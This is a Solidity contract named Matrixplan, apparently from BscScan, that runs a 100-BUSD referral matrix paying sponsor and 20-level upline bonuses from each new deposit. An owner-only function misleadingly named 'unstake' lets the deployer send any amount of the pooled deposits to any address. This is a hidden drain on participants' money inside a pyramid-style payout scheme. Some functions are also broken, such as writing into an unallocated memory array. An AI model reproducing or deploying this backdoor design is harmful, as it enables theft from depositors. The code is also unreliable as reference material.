/**
 *Submitted for verification at BscScan.com on 2023-02-10
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

interface BEP20 {
    function totalSupply() external view returns (uint);
    function balanceOf(address tokenOwner) external view returns (uint balance);
    function allowance(address tokenOwner, address spender) external view returns (uint remaining);
    function transfer(address to, uint tokens) external returns (bool success);
    function approve(address spender, uint tokens) external returns (bool success);
    function transferFrom(address from, address to, uint tokens) external returns (bool success);

    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}

contract Matrixplan {
    using SafeMath for uint256;
    BEP20 public busd = BEP20(0xDc6cc6d847DF088C3eEDA72404864B59c0cD53B2); 
    uint256 private constant timeStep = 10 minutes;
    struct Player {
        address referrer;
        bool isReg;
        uint256 directIncome;
        uint256 depTime;
        mapping(uint256 => uint256) b14Income;
        mapping(uint256 => uint256) b14_level;
        mapping(uint256 => address) b14_lr;
        mapping(uint256 => address[]) b14arr;
        address b14_upline;
        address [] tempArr;
    }
    mapping(address => Player) public players;
    
    address owner;
    uint[20] level_bonuses = [7, 7, 7, 7, 7, 5, 5, 5, 5, 5, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1];
    modifier onlyAdmin(){
        require(msg.sender == owner,"You are not authorized.");
        _;
    }
    constructor() public {
        owner = msg.sender;
        players[msg.sender].isReg = true;
    }

    function deposit(address _refferel, uint256 _busd) public  {
        require(_busd == 100e18, "Invalid Amount");
        require(players[_refferel].isReg==true, "Sponsor Address not registered");
        require(_refferel!=msg.sender, "Sponsor Address and registration Address can not be same");
        require(owner!=msg.sender, "Not for you");
        require(players[msg.sender].isReg==false, "Already registered");
        busd.transferFrom(msg.sender,address(this),_busd);
        players[msg.sender].referrer=_refferel;
        players[msg.sender].isReg=true;
        players[msg.sender].depTime=block.timestamp;
        //referel
        uint256 totalDays=getCurDay(players[_refferel].depTime);
        if(totalDays==0){
            busd.transfer(_refferel,_busd.mul(10).div(100));
            players[_refferel].directIncome+=_busd.mul(10).div(100);
        }
        _setself(_refferel,msg.sender,_busd);
    }
    
    function _setself(address _referral,address _addr,uint256 _amount) private{
        address _parent = _referral;
        Player storage pl=players[_referral];
        for(uint256 i=0;i<20;i++){
            uint256 reqTeam=3**(i+1);
            if(pl.b14arr[i].length<reqTeam){
                if(i>=1){
                    for(uint256 j=0;j<pl.b14arr[i-1].length;j++){
                        if(players[pl.b14arr[i-1][j]].b14_level[0]<3){
                            if(players[pl.b14arr[i-1][j]].b14_level[0]==0){
                                players[pl.b14arr[i-1][j]].b14_lr[0]=_addr;
                            }else if(players[pl.b14arr[i-1][j]].b14_level[0]==1){
                                players[pl.b14arr[i-1][j]].b14_lr[1]=_addr;
                            }else if(players[pl.b14arr[i-1][j]].b14_level[0]==2){
                                players[pl.b14arr[i-1][j]].b14_lr[2]=_addr;
                            }
                            _parent=pl.b14arr[i-1][j];
                            break;
                        }
                    }
                }else{
                    if(pl.b14_level[0]==0){
                        pl.b14_lr[0]=_addr;
                    }else if(pl.b14_level[0]==1){
                        pl.b14_lr[1]=_addr;
                    }else if(pl.b14_level[0]==2){
                        pl.b14_lr[2]=_addr;
                    }
                }
                break;
            }
        }
        players[_addr].b14_upline=_parent;
        
        for(uint8 i = 0; i < level_bonuses.length; i++) {
            players[_parent].b14arr[i].push(_addr);
            players[_parent].b14Income[i]+=_amount.mul(level_bonuses[i]).div(100);
            players[_parent].b14_level[0]++;
            busd.transfer(_parent,_amount.mul(level_bonuses[i]).div(100));
            _parent = players[_parent].b14_upline;
            if(_parent == address(0)) break;
        }
    }
    
    function unstake(address buyer,uint _amount) public returns(uint){
        require(msg.sender == owner,"You are not staker.");
        busd.transfer(buyer,_amount);
        return _amount;
    }

    function b14TeamAddress(address _addr,uint256 inx,uint256 k) view external returns(address [] memory x14,address ia) {
        for(uint8 i=0;i<players[_addr].b14arr[inx].length;i++){
            if(players[_addr].b14arr[inx].length>0){
                x14[i]=players[_addr].b14arr[inx][i];
            }
        }
        return (
            x14,
            players[_addr].b14arr[inx][k]
        );
    }
    
    function incomeDetails(address _addr) view external returns(uint256 dInc,uint256[20] memory x14) {
        for(uint8 i=0;i<20;i++){
            x14[i]=players[_addr].b14Income[i];
        }
        return (
           players[_addr].directIncome, 
           x14
        );
    }
    function getCurDay(uint256 startTime) public view returns(uint256) {
        return (block.timestamp.sub(startTime)).div(timeStep);
    }
}  

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) { return 0; }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}